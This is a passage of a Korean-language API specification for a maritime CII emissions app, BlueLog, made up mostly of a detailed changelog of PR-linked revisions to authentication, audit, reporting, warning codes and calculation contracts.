> **`actor`는 탈퇴 계정도 푼다.** 감사가 답할 질문은 「지금 누가 있는가」가 아니라 **「그때 누가 했는가」**다. 탈퇴는 soft delete라 행이 남아 있고(`record_account_delete`), `is_deleted`로 거르면 탈퇴한 사람이 올린 개정이 **행위자 없음**으로 보인다 — 그것이 감사 기록으로서 가장 나쁜 답이다. 이름·이메일 둘만 싣고 역할·탈퇴 여부 같은 **현재 상태**는 싣지 않는다 — 그것은 감사 행의 일부가 아니다. `app_user.id`(`CHAR(32)`)와 `audit_log.user_id`(`VARCHAR`)는 SQL JOIN으로 묶지 않고 페이지 단위로 UUID를 풀어 `IN`으로 묻는다 — 문자열 모양(하이픈 유무)이 갈리면 JOIN은 조용히 0건이 된다.

> ⚠️ **이 조회는 쓰기 경로를 막지 않는다.** `SELECT`만 하고 잠금을 잡지 않는다 — 조회가 적재·계산을 방해하면 감사 자체가 부담이 되고, 그러면 기록을 줄이자는 압력이 생긴다.

---

## 변경 이력

> git 커밋 기록에서 복원했다(날짜는 커밋 기준). 버전 번호 매핑은 커밋 메시지·헤더 기준의 추정을 포함한다.
>
> **2026-07-23까지가 사후 복원분이다.** 이후 항목은 변경 시점에 직접 기록하며, squash merge로 브랜치 커밋 해시가 재작성되므로 커밋 열에는 **PR 번호**를 적는다.

| 날짜 | 커밋 | 변경 요약 |
|---|---|---|
| 2026-07-03 | `eba6cb8` | v1.1 최초 작성 |
| 2026-07-03 | `9f8a7eb` | 외부 리뷰 반영 (capacity 규칙 분리 등) |
| 2026-07-04 | `0f59999` | 외부 리뷰 P0/P1/P2 전체 반영 + AGENTS.md 추가 |
| 2026-07-04 | `af3b752` | Oracle 리뷰 4건 문서 정합성 수정 |
| 2026-07-04 | `bee61e9` | 포맷 정리 |
| 2026-07-04 | `ec1bf23` | Oracle 3차 리뷰 반영 (F-006~F-008) → v1.2 |
| 2026-07-14 | `0173105` | annotation 라벨 번호 정규화 (5개 정본 일괄) |
| 2026-07-21 | `be0dc23` | 변경이력 표 추가 및 최종 수정일 갱신 |
| 2026-07-29 | `#140` | §7.2 연료 종류 조회 응답 예시 source_ref 정정 (#87) |
| 2026-07-29 | `#142` | 최종 수정일 정정 (07-14 → 07-29) |
| 2026-07-31 | `#152` | 기능① 응답 타입·연료 정규화 계약 명시, Layer 1 직렬화 참조 정리 및 산술 예시 정정 (#132) |
| 2026-08-04 | `#175` | §4.1 `risk_level` 산정 기준 참조에 PRD §9.4.2(확률 화면) 추가 — 기존에는 §9.4.1만 가리켜 기능③ 임계값 출처가 드러나지 않았다 |
| 2026-08-06 | `#187` | §3.1 응답·§3.3 생성 요청에 `regulation_year` 노출, §3.4 PATCH 대상 명시, §3.5에 `INCLUDE_AS_PLAN` 전환 가드 행 신설, §3.3 `[EXT-P0-4]`의 「PLANNED 전환 = INCLUDE_AS_PLAN」 서술 정정 (#150) |
| 2026-08-07 | `#196` | 헤더 「상위 문서」 버전 참조 갱신 — `PRD` v3.2 · `TECH_SPEC` v1.2→v1.4(낡은 참조 정정) (#163) |
| 2026-08-10 | `#218` | §4.1 응답 예시의 `parameters_used.regulation_year.z_factor_percent` 표기를 `"11"` → `"11.0"`로 정정 — `calculation_basis` 블록과 통일 (#208) |
| 2026-08-11 | `#222` | §1.3.2에 `message` 한국어 규정, §1.4에 405 `METHOD_NOT_ALLOWED`·경로 404·미등록 status 범용 `HTTP_ERROR` 행 및 프레임워크 발생 오류 정책(문구·status 보존) 신설 (#182) |
| 2026-08-13 | `#297` | v1.3: §1.2 인증 전면 재작성(구글 OIDC + 세션 쿠키), §1.4에 401·403 행 추가, §13.3 CORS에 X-CSRF-Token·credentials 정책 추가, 인증 엔드포인트 표 신설 (#272) |
| 2026-08-13 | `#323` | v1.4: §3.4에 null 의미론(생략=변경 없음·명시적 null=클리어) 명시, §3.5 policy 제약 서두를 「미지정=현행 유지·EXCLUDE-only 자동 설정·불가 조합 명시적 재지정 요구」로 정정 (#310 #312) |
| 2026-08-13 | `#324` | §3.7 삭제 규칙에 계산 이력 참조 시 409 `CONFLICT` 거부 행 추가 (#313) |
| 2026-08-14 | `#332` | §1.9 응답에 `needs_recalc` 필드 노출 — DWT/GT 변경 시 재계산 필요 표시 (#283) |
| 2026-08-14 | `#338` | §4.1 `next_worse_boundary_margin`·`_ratio`를 nullable(string \| null)로 표기 + 등급 E 응답 예시 블록 추가 — 등급 E는 `null` (#171) |
| 2026-08-14 | `#373` | §1.6에 `SLOW_SPEED_FLOOR` 경고 코드 신설 — 기능② 감속 시나리오 속도 floor(1.0kn) 도달 고지, PRD §11.2 (#57) |
| 2026-08-15 | `#383` | v1.5: §1.10 `as_of` 공통 계약 신설 — 시각 의존 계산의 요청 파라미터·`meta.as_of`·`meta.is_simulated`·재현성 보장 3항. 정본 근거는 `TECH_SPEC §5.4.1` (#368) |
| 2026-08-15 | `#384` | v1.6: §2.6 선박 위치·운항 상태 갱신 엔드포인트 신설 — 026(#346)이 만든 컬럼의 유일한 갱신 경로. 상태 2축·위경도 쌍 규칙을 스키마 표면에 명시, `position_updated_at`은 서버 확정. §2.1 선박 객체에 위치·상태 5키 추가 (#369) |
| 2026-08-15 | `#404` | §10 `rng_canonical_test` 유예 각주를 구현 완료 서술로 교체 — `#43` 머지로 유예 조건이 해소됐다. `"failed"`여도 `status`는 `ok`를 유지하는 근거(liveness vs 재현성 신호 분리)를 명시 (#400) |
| 2026-08-15 | `#405` | 변경 이력 표의 PR 번호 공란 2건을 채우고 순서 교정 — v1.5 → #383(`as_of` 계약) · v1.6 → #384(위치 갱신). #401이 `DB_SCHEMA`만 정리하고 이 문서를 빠뜨린 것을 보완한다. 문서 내용 변경 없음 (#401) |
| 2026-08-16 | `#413` | **§1.2 인증 전면 재작성 — 구글 OIDC 제거.** 이메일·비밀번호 인증으로 교체하고 인증 엔드포인트 8종 명세(signup·login·logout·me·verify-email 2종·password-reset 2종) · 공개 경로 갱신 · **계정 존재 여부를 노출하지 않는 규칙**과 **재설정 시 기존 세션 전량 무효화** 근거 명시 · 비밀번호는 해시만 저장함을 명문화 (#413) |
| 2026-08-17 | `#408` | §1.2 토큰 규칙 각주를 구현 완료 서술로 교체 — 원문 미저장·유효기간(인증 24h·재설정 1h)·재발송 시 이전 토큰 무효화·실패 사유 비구분 근거 명시 (#408) |
| 2026-08-16 | `#356` | §2.7 응답에 `transport_capacity_basis` 추가 — 표시 단위의 축(DWT·GT)을 서버가 내려준다. `DESIGN_SYSTEM §4.1`이 고정 문자열을 금지하므로 화면이 선종에서 유추하지 않게 하기 위함이며, 유추하면 선종 확장 시 서버와 갈라진다 (#356) |
| 2026-08-16 | `#350` | **§2.8 선대 요약 조회 신설** — 대시보드가 한 번의 호출로 선대 전체 현황을 받는 `GET /fleet/summary`. `risk_level`(PRD §9.4.1 표시용)과 `risk_reasons`(PRD §3.3.7 규제 트리거)를 분리해 함께 반환하는 근거, `days_to_d` 경계 4종, 선박 0척이 오류가 아닌 근거를 명시. 엔드포인트 요약 표에 1행 추가 (#350) |
| 2026-08-15 | `#380` | §2.7 `rating` 설명의 `PRD §3.3.7` 참조를 `§3.3.8`로 정정 — 이 근거(YTD는 공식 등급이 아님)는 실시간 CII 절의 내용인데, `#386`이 `§3.3.7`을 「등급 하락의 규제상 귀결」로 선점해 참조가 다른 절을 가리키고 있었다 (#358) |
| 2026-08-17 | PR #423 | **v1.12 — `§2.9`~`§2.13` not under way 구간 CRUD 신설 (`#370`).** `#345`가 테이블을, `#347`이 시드를, `#353`이 읽는 쪽을 만들었으나 **쓰는 쪽이 없어** 정박 연료를 운영 중에 넣을 수 없었다. 6개 엔드포인트를 추가하고 `§12` 요약표에 등재. 명세로 확정한 판정 셋 — ⑴ 구간 **겹침 금지**(열린 구간 = 무한대 · 경계는 닫힘-열림), ⑵ `cf_used`는 **서버가 뜬다**(요청에서 받지 않는다), ⑶ 삭제는 **소프트**. `§2.9` `meta`가 선택지 3종(`period_types`·`consumer_types`·`fuel_types`)을 싣는데, 연료 코드는 `§7.2` 연료 조회 API가 **미구현**이라 임시로 여기서 준다 |
| 2026-08-17 | PR #424 | **v1.13 — `§2.14` 실시간 CII 3종 값 조회 신설 (`#354`).** ⑴ 연간 누적 · ⑵ 항차 구간값 · ⑶ 연말 예상을 한 번에 반환한다 — 값마다 따로 물으면 기준 시점이 어긋나 셋이 서로 모순된다. **등급은 ⑴에만 붙고 ⑵는 `rating: null`을 명시**한다(`COR-1`). ⑶은 「YTD 일평균 유지」 가정으로 외삽하되 **같은 YTD 엔진을 다시 부른다** — 식이 갈리면 ⑴과 ⑶이 모순된다. `warnings`에 `SIMULATION_NO_FUEL_RATE`·`SIMULATION_NO_FUEL_TYPE` 추가: 시계가 연료를 만들지 못하면 **진행분을 아예 넣지 않는다**(거리만 넣으면 분모만 늘어 항해할수록 등급이 좋아진다) |
| 2026-08-17 | PR #426 | **v1.14 — `§8.3`~`§8.5` 리포트 API 신설 (`#361`).** 항차 완료·연간 실적 리포트를 PDF·CSV·**HTML**(미리보기)로 낸다. 응답이 JSON이 아니라 파일이며 **CSV만 스트리밍**이다(PDF는 페이지 나눔 때문에 전체를 봐야 첫 페이지가 확정된다). `§8.5` 공통 규약에 **CSV injection 방어**(시작 문자 `= + - @ \t \r` → `'` 접두, 음수도 예외 없음) · UTF-8 BOM · CRLF · 면책 배치(CSV는 **맨 앞**, PDF는 표지+푸터) · PDF 렌더링 스택(WeasyPrint + `fonts-nanum`, SIL OFL)을 확정. **진행 중 항차는 422**(`STATE_TRANSITION_ERROR`) — 실적 미확정 값으로 문서를 만들면 같은 항차의 리포트가 시점마다 달라진다 |
| 2026-08-17 | PR #437 | **v1.15 — `§6.1` 구현 확정 사항 (`#64`).** 응답에 `simulation_id`·`calculation_run_id`를 추가했다 — `#433`이 정한 대로 후행 기능(감축 계획)이 **같은 스냅샷·같은 seed를 재사용**할 수 있어야 한다. 민감도의 `target_probability_change`는 **같은 seed로 다시 돌려** 낸다(common random numbers) — seed를 새로 뽑으면 「변수 때문에 바뀐 것」과 「표본이 달라서 바뀐 것」을 가를 수 없다. 위험도는 `PRD §9.4.2`의 **확률 기반**이다(기능①·②의 마진 기반이 아니다) |
| 2026-08-17 | PR #438 | **v1.16 — §2.8 `unavailable_reason` 신설 (`#419`).** `data_available=false`인 선박이 **왜** 그런지 4종(`NO_DATA` · `MISSING_SPEC` · `NO_PARAMETERS` · `CALCULATION_ERROR`)으로 구분한다. 사용자가 할 일이 서로 다르므로(항차 등록 · 제원 입력 · 운영자 문의) 한 사유로 뭉치면 화면이 안내할 수 없다. 한 척의 계산 실패가 요청 전체를 500으로 만들지 않는다는 계약과, **연도 파라미터 부재는 여전히 409**라는 경계를 함께 명시 (#419) |
| 2026-08-17 | `#445` | §12 엔드포인트 요약표에 **구현돼 있으나 빠져 있던 10건 등재** — 인증 9종(`#414`가 §1.2를 재작성하며 요약표에 넣지 않았다) · `PATCH /vessels/{id}/position`(`#369`). 요약표만 보는 사람에게는 인증 API가 존재하지 않는 상태였다. 행 추가이므로 `AGENTS §4.3`에 따라 버전은 올리지 않는다 (#445) |
| 2026-08-17 | PR #456 | **v1.17 — §2.14 `ytd.substitutions` 신설 (`#449`)** · 경고 `COMPLETED_NO_DISTANCE` 추가. `PRD §8.3`의 값 우선순위가 실적 대신 계획값을 고른 **결과를 항차별로** 싣는다. 종전에는 불리언 하나로 뭉개져 경고 1건만 나갔고, 무엇을 고쳐야 하는지 알 수 없었다. **거리 대체는 경고조차 없었다** — 거리는 CII의 분모라 영향이 연료 못지않다 (#449) |
| 2026-08-17 | PR #457 | **v1.18 — §3.6 항차 실적 입력 구현 확정 (`#440`).** 상태별 허용 표(`IN_PROGRESS`·`COMPLETED`만) · 계획값을 지우지 않는 근거(`PRD §8.4`) · CF snapshot 보존 · 오류 응답 4종을 명시했다. 종전에는 요청·응답 예시만 있어 **「어느 상태에서 받는가」와 「계획값은 어떻게 되는가」가 비어 있었다** (#440) |
| 2026-08-17 | `#460` | 헤더 「상위 문서」를 `PRD` v4.0 → **v4.4** · `TECH_SPEC` v1.5 → **v1.7**로 갱신 (`AGENTS §4.4`). 이 문서는 v4.3의 인증 전환(§1.2 재작성 `#414`)·§25 리포트(§8.3~§8.5)를 반영했고, `TECH_SPEC §5.2.1.1`(v1.6 신설)을 §6.1이 인용한다. 제목을 `API_SPEC — BlueLog`로 통일(`AGENTS §4.5`). 본문 변경 없음 (#460) |
| 2026-08-18 | PR #496 | **v1.19 — §8.2 CSV 가져오기 구현 확정 (`#60`).** `dry_run` 쿼리 파라미터 신설(올리기 전에 몇 행이 걸리는지 먼저 본다) · 응답에 `dry_run` 필드 · **행 번호가 파일에서 보이는 번호**(헤더 1행 기준)임을 명시 · **부분 성공** 계약을 적었다(틀린 행이 파일 전체를 되돌리지 않는다 — 파라미터 import(`§7.5`)와 반대다) · 행 수 상한은 **거부가 아니라 절단**이며 잘라 낸 수를 `errors[]`에 남긴다 · 가져온 항차의 초기 상태(`DRAFT`/`EXCLUDE`, `created_from=IMPORT`). 종전에는 보안 제한 표만 있어 **「틀린 행이 있으면 어떻게 되는가」가 비어 있었다** (#60) |
| 2026-08-21 | `#602` | `§N-M` 표기 정리에 따른 참조 갱신 (`AGENTS §4.7` 신설분 반영). 본문 내용 변경 없음. **이 행은 `#641`이 뒤늦게 채웠다** (#602) |
| 2026-08-22 | PR #642 | **§1.6 Warning 코드 8종 등재 (`#630`).** 코드가 내는 17종 중 7종이 표에 없었다 — 기능③이 들어온 뒤 갱신되지 않았다. 화면의 `WARNING_MESSAGE`가 이 표를 전사한 것이라 **연간 시뮬레이션 화면이 원문 코드를 그대로 노출**하고 있었다. 문구는 `PRD §12.8`에서 옮겨 적었고, 그 표에 문구가 없는 3종만 서술된 동작에 맞춰 새로 적었다. **이 행은 `#641`이 뒤늦게 채웠다** — `PR #642`가 `§4.1`을 어겼다 (#630) |
| 2026-08-22 | `#641` | §2.9 `meta.fuel_types` 서술 정정 — 「`§7.2` 연료 조회 API가 **아직 구현되지 않아**」가 사실과 달랐다. `#444`가 구현했고 화면이 그쪽을 쓴다. **필드 자체는 계속 싣는다** — 빼는 것은 응답 계약 축소라 별도 판정이 필요하다. `§4.3`상 각주 보강이라 버전은 올리지 않는다 (#641) |
| 2026-08-22 | `#648` | §1.1 인증 예외 경로 표에 **축약 표기임을 명시**하는 각주 추가. 이 표가 `/api/v1`을 생략해 적는데 구현의 공개 경로 목록이 그것을 문자 그대로 옮겨 **prefix 없는 사본 8개**를 들고 있었다 — 실제 요청이 그런 경로로 오지 않아 영원히 매치되지 않는 항목이었다. `§4.3`상 각주 보강이라 버전은 올리지 않는다 (#648) |
| 2026-08-22 | `#653` | **v1.20 — §2.8 선대 행에 `is_cii_applicable_hint`·`gross_tonnage` 신설 · §1.6에 `CII_APPLICABILITY_UNKNOWN` 등재.** CII 적용 대상 여부를 보여 주는 화면이 **선박 등록 결과 한 곳뿐**이었다 — 등록 직후 한 번 지나가는 화면이라 이후 대시보드·목록·상세·보고서 어디에서도 그 선박이 규제 대상인지 알 수 없었다. ① 선대 응답에 서버 판정과 총톤수를 함께 실어 **「미해당」과 「GT가 없어 판정 불가」를 화면이 가를 수 있게** 했다 — 둘을 합치면 총톤수를 넣지 않은 사용자가 「이 배는 규제 대상이 아니다」로 읽는다 ② 종전 `NON_CII_VESSEL`은 **GT를 알 때만** 붙어, GT가 NULL인 데모 실선 2척에는 아무 경고도 붙지 않았다. `CII_APPLICABILITY_UNKNOWN`이 그 공백을 메운다 ③ `NON_CII_VESSEL` 조건을 「GT를 **알고** 5,000 미만」으로 정밀화 — 구현이 처음부터 그랬는데 표만 `GT < 5,000`으로 적고 있었다 (#653) |
| 2026-08-22 | `#634` | **§1.2 로그아웃 계약 정정 — 「멱등 (세션 없어도 204)」 삭제 · CSRF 예외 없음 명시.** 그 문구는 **같은 행의 「인증: 필요」와 모순**이었고, `#272`(PR `#297`)에서 사유 없이 들어왔다 — 이슈 본문·완료 기준 어디에도 멱등 요구가 없다. 구현(`auth_middleware`)과 테스트 2곳은 처음부터 보호 경로로 다뤄 왔고 **문서 한 줄만 반대**였다. 로그아웃을 공개 경로로 두는 대안은 인증 예외 경로 표의 두 사유(「인증 플로우 자체」·「메일 링크로 진입」) 어디에도 해당하지 않으며, 제3자 사이트가 사용자를 강제 로그아웃시킬 수 있게 된다. 함께 **CSRF 예외를 없앴다** — 상태 변경 라우트 31개 중 검증이 없던 8개는 전부 세션 없는 공개 인증 경로인데 `POST /auth/logout`만 **세션을 요구하면서 검증이 없었다.** `§4.3`상 오기 정정·각주 보강이라 버전은 올리지 않는다 (#634) |
| 2026-08-22 | `#649` | **§1.6에 `IN_PROGRESS_PAST_ETA` 등재.** 진행 중 항차가 도착 예정일을 지났는데 도착 실적이 없을 때 붙는다. 누적을 예정일에서 자르는 것만으로는 부족하다 — **왜 값이 더 늘지 않는지**가 응답에 없으면 사용자는 값이 멈춘 것을 「항차가 끝났나」로 읽는다. 실사용에서 이 상태는 「운항이 계속되고 있다」가 아니라 **「도착 실적 입력을 잊었다」**이므로 문구가 할 일을 안내한다. 정의는 `TECH_SPEC §12.3`이며 사슬은 `tests/test_warning_codes_sync.py`가 검사한다. `§4.3`상 소규모 행 추가라 버전은 올리지 않는다 (#649) |
| 2026-08-23 | `#59` | **v1.21 — §8.1 CSV 내보내기 컬럼 확정.** 종전 예시 헤더 (`voyage_no,status,departure,arrival,distance_nm,speed_kn,fuel_type,fuel_ton,co2_ton,attained_cii,rating`)는 **있는 그대로 구현할 수 없었다** — ⑴ `attained_cii`·`rating`은 `calculation_run.voyage_id`가 항상 NULL이라 어떤 항차의 계산인지 되짚을 수 없고, 「항차 하나의 CII」는 정본에 정의된 양도 아니다(`PRD §8.1.2`) ⑵ `distance_nm`·`speed_kn`·`fuel_ton`은 계획·실적 중 무엇인지 갈렸다(DB는 둘을 나눠 갖는다). 고쳐야 한다면 **쓸모 있는 방향으로** 고쳤다 — 앞 일곱 열을 `§8.2` 필수 컬럼과 **이름·순서까지 같게** 두어 **왕복**(내보내서 고쳐서 다시 넣기)이 성립하고, 실적·CO₂·시각을 뒤에 덧붙였다(가져오기가 여분 열을 무시한다). CII 두 열은 **열 자체를 두지 않는다** — 비워 두면 「아직 계산 안 됨」으로 읽히지만 영원히 채워지지 않는 칸이다. 함께 `calculations`·`simulations` 컬럼(정본 어디에도 없었다) · `year`의 type별 의미 · 값 표기(빈 칸·지수 금지·KST 오프셋) · `format=json` 봉투 · 오류 2종을 명시했다. `§4.3`상 구조 변경이라 버전을 올린다 (#59) |
| 2026-09-11 | `#840` | **v1.22 — §6.1 응답 예시의 `data` 첫머리에 `simulation_id` 추가.** v1.15(`PR #437`) 변경 이력이 *「응답에 `simulation_id`·`calculation_run_id`를 추가했다」*로 적었는데 **예시만 반영되지 않았다.** `§6.2` 조회와 `§6.4` 재실행의 경로 파라미터가 바로 이 값(`annual_simulation_run.id`)이고 `calculation_run_id`와 **다른 값**이라, 예시만 읽고 클라이언트를 만들면 두 경로에 도달할 수 없다. 구현(`_envelope`)·라우트 docstring·변경 이력 셋이 이미 일치하고 **예시 하나만 빠져 있었다.** 최상위가 아니라 `data` 안에 둔 것은 최상위가 `§1.3.1` 계산 결과 공통 필드의 자리이고 `simulation_id`는 그 목록에 없기 때문이다 — 구현도 그렇게 낸다 (#840) |
| 2026-09-11 | `#944` | **v1.23 — §1.9 · §2.4의 `needs_recalc` 설명에 선종 변경 추가.** `PRD §8.4`가 v4.6에서 「선박 제원 변경 (DWT/GT · 선종)」으로 넓어진 것을 따랐다. 구현은 `#818`에서 이미 그렇게 동작한다 (#944) |
| 2026-09-11 | `#860` | **v1.24 — §2.3 검증 표에 선박 제원의 저장 경계 기재 · `reference_daily_foc_ton` 행 추가.** 종전 표는 `> 0`만 적어 `1e-7`·`1e10`이 API를 통과한 뒤 DB에서 500이 났다. 경계는 `NUMERIC(p,s)` 정밀도에서 나오며 도메인 하한이 아니다 (#860) |
| 2026-09-11 | `#800` | **v1.25 — `in_progress_voyage_count` 신설(§2.7 연도 행 · §2.8 `ytd`).** 진행 중 항차의 기여분은 거리·연료에 들어가는데 `voyage_count`는 세지 않아 연간 리포트 한 표 안에서 **두 항차의 거리를 1항차로 적었다.** `voyage_count`의 뜻(실적 확정 항차 수)은 바꾸지 않았다 — 뒤집으면 과거 연도와 올해가 다른 것을 센다. 추가 필드라 기존 소비자는 영향이 없다 (#800) |
| 2026-08-23 | `#591` | **§9 Weather API 2종을 「미구현」으로 명시** — 세 안 중 C(스펙에 남긴다). 빠진 것은 **HTTP 노출뿐**이고 조회·저장·fallback은 다 구현돼 시나리오 비교가 실제로 쓴다 — 지우면 「기상 fallback을 바깥에서 들여다볼 수단을 두려 했다」는 판단까지 사라진다. 구현은 인가 설계(`#359` — 1차 시연 범위 밖)가 선행한다. 표기는 새 기호를 만들지 않고 `§12`의 기존 선례(`/auth/dev-login`의 「(프로덕션 미등록)」)를 따랐다. ⚠️ 함께 **어긋남이 양방향이라는 것을 실측으로 확인**했다 — `§12` 요약표에 `#506`의 계정 관리 3종(`PATCH`·`DELETE /auth/me` · `POST /auth/password-change`)이 **등재돼 있지 않았다.** `§1.2` 본문에는 있어 **같은 문서가 자기와 어긋난** 상태였다. 3행을 등재하고, 같은 표에서 같은 상태인 `POST /parameters/import`(`#444`)도 함께 표시했다. 이 판정이 낡지 않게 **`§12` ↔ 실제 라우트 대조 가드**를 신설했다 — 누군가 구현하면 테스트가 깨져 표시를 지우게 한다. `§4.3`상 각주 보강·소규모 행 추가라 버전은 올리지 않는다 (#591) |
| 2026-08-23 | `#559` | **§1.3에 응답 계약 가드 각주 추가.** 요청은 Pydantic이 강제하는데 응답은 강제하는 것이 없었다 — 오퍼레이션 50개 중 requestBody 스키마 23건, **200 응답 스키마 0건**. 네 안(응답 모델 · 필드 집합 테스트 · 예시 대조 · 하지 않는다) 중 **B(필드 집합 테스트)**를 택했다: A는 `§1.7` Layer-1 문자열 표기와의 양립 검토가 선행하고 그 검토가 이 작업보다 크며, C는 예시 30곳의 값까지 맞춰야 해 유지비가 크다. **값이 아니라 키를 본다** — 이 결함의 실제 모습은 이름이 바뀌거나 필드가 빠지는 것이고, 그때 화면에는 오류가 아니라 `undefined`가 뜬다. **집합 동등**이라 필드를 더해도 실패한다(화면 세 곳이 같은 응답을 각자 타입으로 적고 있어 넓어지는 변화도 리뷰에 보여야 한다). `§4.3`상 각주 보강이라 버전은 올리지 않는다 (#559) |
| 2026-08-23 | `#151` | **§5.1 응답 예시 3블록을 실행 결과로 교체.** 종전 예시는 **인쇄된 입력으로 재현되지 않았다** — `fuel_ton`·`attained_cii`·`co2_emission_ton`이 서로 맞지 않았고 `next_worse_boundary_margin`은 `§4.1`에서 이미 정정된 오기(`0.365537`)를 그대로 갖고 있었다. 원인은 **기준 선박의 `reference_speed_kn`이 명시되지 않은 것**이다: 연료 추정이 cubic speed model이라 `v_ref` 없이는 `fuel_ton`이 정해지지 않는다. 그래서 이 이슈가 「입력 가정 확정이 선행한다」고 적었고, 그 가정을 **저장소의 데모 선박(`…0001` · `v_ref = 12.00`)으로 고정**해 실제로 실행하고 그 응답을 실었다. 요청 예시도 둘 고쳤다 — ⑴ `base_daily_foc_ton` `35.0` → **`18.0`**: `35.0`이면 세 시나리오가 모두 등급 `E`가 되어 `next_worse_boundary_margin`이 전부 `null`이 되고 `[ORACLE-S-1]`이 그 필드를 추가한 목적이 예시에서 사라진다. `18.0`은 **감속이 등급을 한 단계 올리는**(C → B) 구간이다 ⑵ `weather_model` `SIMPLE_RULE` → **`NONE`**: 전자는 Open-Meteo를 실제로 호출해 **문서 예시가 외부 서비스의 그날 값에 따라 달라진다.** 함께 `DIRECT`와 `DETOUR`의 `attained_cii`가 같은 이유를 각주로 남겼다 — 우회는 `M`과 `D`를 같은 비율로 키워 등급을 바꾸지 않는다. `§4.3`상 값 정정·각주 보강이라 버전은 올리지 않는다 (#151) |
| 2026-08-23 | `#689` | **§8.5 PDF 렌더링 — 폰트 부재 시 거부로 전환 · §10에 `pdf_korean_font` 등재.** 시연 서버(`scripts/demo_up.sh`)가 만든 PDF의 한글 332자가 전부 □였고, 그중에 `PRD §18.2` 면책 문구가 있었다. **어디에서도 오류가 나지 않았다** — `200` · 유효한 `%PDF-1.7` · 정상 크기. 진단 함수(`has_korean_font()`)는 이미 있었고 **부르는 곳이 없었다.** 두 안(A 감지만 강화 · B 거부) 중 **B**를 택했다: `pdf.py`는 렌더러 부재에 이미 `PdfUnavailableError`(500) + CSV 안내를 쓰고 있고, 폰트 부재도 **「사용자 입력이 아니라 배포 환경의 문제」**라는 같은 성격이다. 읽을 수 없는 면책이 실린 문서는 리포트가 아니다. 막히는 것은 폰트 없는 서버 하나뿐이며(컨테이너·CI에는 `fonts-nanum`이 있다) CSV·HTML은 그대로 나간다. 판정은 **프로세스당 1회**로 묶었다 — 매 요청 프로브를 렌더링하면 PDF 한 건에 렌더링이 두 번 일어난다. `§10`의 새 필드는 `rng_canonical_test`와 **같은 규약**이다(`"missing"`이어도 `status`는 `ok` — 재시작으로 해결되지 않는다). 렌더러 부재(`"unavailable"`)와 폰트 부재(`"missing"`)를 **뭉치지 않는다**: 설치해야 할 것이 다르다. `§4.3`상 소규모 행 추가라 버전은 올리지 않는다 (#689) |
| 2026-09-08 | `#812` | **§1.6에 `SIMULATION_PLAN_NO_FUEL` 추가.** 기능③의 계획 항차에 연료 정보가 없으면 그 항차를 연말 예상에서 제외한다. 거리만 넣는 대안은 「거리는 가는데 배출은 0」이라는 거짓 진술이 되어 분모만 키우고 **연말 예상 CII를 실제보다 좋게** 만든다 — 이 이슈가 고치는 결함(연료 2종 시 거리 2배 계상)과 같은 방향의 오류다. 빼되 **조용히 빼지 않는다**: 응답의 `remaining_voyage_count`는 스냅샷의 PLAN 행을 세므로, 경고가 없으면 「N건 중 일부만 계산했다」가 드러날 자리가 없다. 정본은 `TECH_SPEC §12.3`이며 이 절은 전사다 (#812) |
| 2026-09-08 | `#750` | **§2.7 각주 정정 · §2.8에 YTD 정의 명시.** 「연간 누적(YTD)」이 엔드포인트마다 다른 값을 냈다 — 실측에서 같은 선박·같은 연도에 대시보드 8.9799 · `§2.7` 8.980 · `§2.14` 7.028270이 나왔고, 연간 실적 리포트는 **한 문서 안에 두 값을 함께 인쇄**했다. 원인은 `compute_ytd_cii`의 `in_progress` 인자를 넘기는 호출과 넘기지 않는 호출이 섞인 것인데, **정본이 정면으로 부딪혀 있어 구현만 맞출 수 없었다** — `PRD §3.3.8`은 진행 중 항차의 `IN_PROGRESS latest estimate`를 YTD에 넣으라 하고, 종전 `§2.7` 각주는 「`INCLUDE_AS_PLAN` 항차는 세지 않는다」로 적었다. `AGENTS §3.1`상 `PRD`(2위)가 이 문서(4위)보다 앞서므로 상위에 맞춘다. `§2.8`은 이 분기에 **침묵**해 대시보드가 어느 정의를 쓰는지 문서로 판정할 수 없었고, 그 값 위에서 위험 배너·등급 분포·정렬·`days_to_d`가 도므로(`PRD §3.3.7`) 정의가 갈리면 **규제 트리거 판정이 뒤집힐 수 있다** — 명시로 메웠다. 과거 연도는 영향이 없다(진행 중 항차는 올해에만 존재). `voyage_count`는 종전대로 실적 확정 항차 수이며, 항차 수와 누적값의 단위가 다른 문제는 `#800`이 다룬다 (#750) |
| 2026-09-08 | `#796` | **§1.6에 `SIMULATION_NO_REFERENCE_SPEED` 추가.** 진행 중 항차의 누적 연료에 cubic speed model(`TECH_SPEC §4.1`) 보정을 적용하려면 `vessel.reference_speed_kn`이 필요한데 그 열은 nullable이다(`DB_SCHEMA §2.1`). 없으면 배수 1로 쌓되 **조용히 넘어가지 않는다** — 소모율도 속도도 있고 모르는 것이 보정 계수 하나뿐이라 기여를 통째로 빼지 않지만, 값이 정확하지 않다는 사실은 화면이 말할 수 있어야 사용자가 제원을 채운다(`SIMULATION_NO_FUEL_RATE`와 같은 방식). 정본은 `TECH_SPEC §12.3`이며 이 절은 전사다 (#796) |
| 2026-09-08 | `#757` | **§1.7 Layer 2 행을 JSON 문자열로 정정 · §6.1 Monte Carlo 예시 교체.** 종전 표기는 **JSON 숫자**(예: `0.0200`)였으나 **같은 행의 「4 유효숫자」와 성립하지 않는다** — JSON 숫자로는 후행 0을 표현할 수 없어 `0.0200`이 `0.02`가 된다. 구현(`services/annual_simulation.py`)과 화면 타입(`types.ts` `MonteCarloBlock`)은 처음부터 문자열이었고, Layer 1을 문자열로 두는 이유(JSON float 파싱에 의한 정밀도 손실)가 Layer 2에도 그대로 적용된다. `#757`이 `TECH_SPEC §2.4`대로 `quantize(Decimal("0.0001"), ROUND_HALF_UP)`로 바꿔 **소수 4자리가 고정**되므로, 문자열이라야 그 계약이 응답까지 전달된다. `§6.1` 예시도 실제 직렬화(`"0.0200"`·`"4.7100"`)로 맞췄다 (#757) |
